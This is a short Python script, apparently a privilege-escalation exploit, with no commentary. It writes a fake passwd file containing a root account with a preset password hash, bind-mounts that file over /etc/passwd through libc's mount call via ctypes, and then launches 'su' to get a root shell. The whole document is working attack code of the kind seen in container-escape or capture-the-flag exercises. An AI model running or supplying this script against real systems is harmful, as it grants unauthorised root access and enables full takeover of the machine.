import ctypes,os
a,b,c=["libc.so.6","/etc","passwd"]
d=ctypes.cdll.LoadLibrary(a)
d.mount.argtypes=[ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_char_p]
e=open(f"{c}", "w")
e.write("root:$1$coiffeur$XvB.cT7JRRpX.JUEdqTc40:0:0:root:/root:/bin/bash\n")
e.close()
d.mount(f"{c}".encode(),f"{b}/{c}".encode(), b"", 4096, b"rw")
os.system("su")